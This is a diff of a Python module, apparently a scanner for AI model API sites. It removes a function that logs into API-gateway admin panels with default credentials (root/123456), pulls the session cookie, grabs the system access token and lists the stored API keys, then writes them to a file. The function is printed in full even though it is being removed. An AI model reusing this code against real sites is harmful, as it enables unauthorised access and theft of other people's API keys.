@@ -11,8 +11,6 @@ import os
 import re
 import time
 from dataclasses import dataclass
-from http.client import HTTPResponse
-from typing import Any
 from urllib import error, parse, request
 
 import aiofiles
@@ -765,38 +763,6 @@ def batch_probe(
     return [x for x in sites if x]
 
 
-def read_response(response: HTTPResponse, expected: int = 200, deserialize: bool = False, key: str = "") -> Any:
-    if not response or not isinstance(response, HTTPResponse):
-        return None
-
-    success = expected <= 0 or expected == response.getcode()
-    if not success:
-        return None
-
-    try:
-        text = response.read()
-    except:
-        text = b""
-
-    try:
-        content = text.decode(encoding="UTF8")
-    except UnicodeDecodeError:
-        content = gzip.decompress(text).decode("UTF8")
-    except:
-        content = ""
-
-    if not deserialize:
-        return content
-
-    if not content:
-        return None
-    try:
-        data = json.loads(content)
-        return data if not key else data.get(key, None)
-    except:
-        return None
-
-
 def no_model(content: str, model: str = "") -> bool:
     content = utils.trim(content)
     if not content:
@@ -937,75 +903,3 @@ def verify(
     not_exists = no_model(content=content, model=model)
     terminal = available or not_exists
     return CheckResult(available=available, stream=support, version=version, terminate=terminal, notfound=not_exists)
-
-
-def burst_newapi(domain: str, filepath: str, username: str = "root", password: str = "123456") -> None:
-    domain = utils.extract_domain(domain)
-    if not domain:
-        logger.error(f"[Check] skip reverse due to domain is empty")
-        return
-
-    username = utils.trim(username) or "root"
-    password = utils.trim(password) or "123456"
-
-    login_url = f"{domain}/api/user/login"
-    params = {"username": username, "password": password}
-    headers = {
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Encoding": "gzip",
-        "Content-Type": "application/json",
-        "Host": utils.extract_domain(url=domain, include_protocal=False),
-        "Origin": domain,
-        "Referer": f"{domain}/login",
-        "User-Agent": utils.USER_AGENT,
-    }
-
-    response = utils.http_post_noerror(url=login_url, headers=headers, params=params, timeout=10)
-    success = read_response(response=response, expected=200, deserialize=True, key="success")
-    if not success:
-        return
-
-    line = f"{domain}\t{username}\t{password}"
-
-    # extract response cookie
-    cookies = response.getheader("Set-Cookie")
-    headers["Cookie"] = cookies
-
-    # query or re-generate system access token
-    try:
-        info_url, token = f"{domain}/api/user/self", ""
-        content = utils.http_get(url=info_url, headers=headers)
-
-        try:
-            result = json.loads(content)
-            data = result.get("data", {})
-            if data and isinstance(data, dict):
-                token = utils.trim(data.get("access_token", ""))
-        except:
-            pass
-
-        if not token:
-            access_token_url = f"{domain}/api/user/token"
-            content = utils.http_get(url=access_token_url, headers=headers)
-
-            data = json.loads(content) if content else {}
-            if data and data.get("success", True):
-                token = utils.trim(data.get("data", ""))
-
-        line = f"{line}\t{token}" if token else line
-    except:
-        logger.error(f"[Check] generate system access token failed, domain: {domain}")
-
-    # get api token
-    try:
-        token_url = f"{domain}/api/token/?p=0&size=10"
-        content = utils.http_get(url=token_url, headers=headers)
-        data = json.loads(content).get("data", [])
-        if data and isinstance(data, list):
-            tokens = [f'sk-{item.get("key")}' for item in data if isinstance(item, dict) and "key" in item]
-            keys = "|".join(tokens)
-            line = f"{line}\t{keys}" if keys else line
-    except:
-        logger.error(f"[Check] cannot get api token, domain: {domain}")
-
-    utils.write_file(filename=filepath, lines=line, overwrite=False)
